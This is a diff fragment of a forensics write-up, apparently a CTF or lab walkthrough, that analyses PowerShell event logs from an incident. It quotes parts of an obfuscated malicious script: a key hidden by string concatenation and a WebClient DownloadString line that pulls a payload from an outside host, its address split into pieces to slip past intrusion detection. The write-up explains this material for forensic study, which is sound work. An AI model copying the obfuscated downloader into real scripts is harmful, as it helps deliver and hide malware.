@@ -86,7 +86,7 @@ Example:
 ## Approach
 
 First lets examine the Event Log  
-<img width="958" height="281" alt="image" src="https://github.com/user-attachments/assets/7b2c0654-a978-4a8b-ae65-90cdd5ad6e49" />
+><img width="958" height="281" alt="image" src="https://github.com/user-attachments/assets/7b2c0654-a978-4a8b-ae65-90cdd5ad6e49" />
 Here we see that in the course of 21 seconds PowerShell was launched and ran several commands, likely due to an automated PowerShell script.  
 Let's investigate the logs:  
 The first three Information Level alerts just tells us that PowerShell was started with information on the affected User and Computer:  
@@ -96,14 +96,16 @@ The first three Information Level alerts just tells us that PowerShell was start
 The first Verbose alert is a simple script block creating a prompt to accept input into PowerShell. The ScriptBlockID is just a unique Identifier for this particular ScriptBlock and doesn't contain any important information by itself.  
 The second Verbose alert is where things get interesting. The ScriptBlockText is **.\updates.ps1** which is a command to run updates.ps1 script that is in the current working directory. We will note this filename and look for it in later logs and the Network Packet Capture.  
 The third Verbose alert shows us the details of the script that is being run:  
-<img width="1125" height="176" alt="image" src="https://github.com/user-attachments/assets/7cfdc375-4365-4bd1-85ea-ec0daa720c79" />  
+><img width="1125" height="176" alt="image" src="https://github.com/user-attachments/assets/7cfdc375-4365-4bd1-85ea-ec0daa720c79" />  
 This script is being obfuscated behind Encoding to attempt to avoid Intrusion Detection Systems(IDS) and to make the Forensic Analyst's job harder.
 >$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
 
 This piece of script is defining variable $k and using this UTF8 encoding function to concatinate these individual strings in an attempt to hide the true value of the key which is **X9vT3pL2QwE8xR6ZkYhC4s** and we will take note of this because we will likely use this key to decrypt payloads in our packet capture.  
 > $h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
 
-This piece of code is defining variable $h and again by using functions that manipulate strings to obfuscate the true value being assigned to this variable. A quick rundown is that join() will concatinate the individual strings, and replace() will delete any whitespace because \s is the RegEx for whitespace and it's replacing those with '' which is essentially a blank string.  
+This piece of code is defining variable **$h** and again by using functions that manipulate strings to obfuscate the true value being assigned to this variable.  
+A quick rundown is that **join()** will concatinate the individual strings, and **replace()** will delete any whitespace because **\s** is the RegEx for whitespace and it's replacing those with '' which is a blank string.  
+>
 
 
 
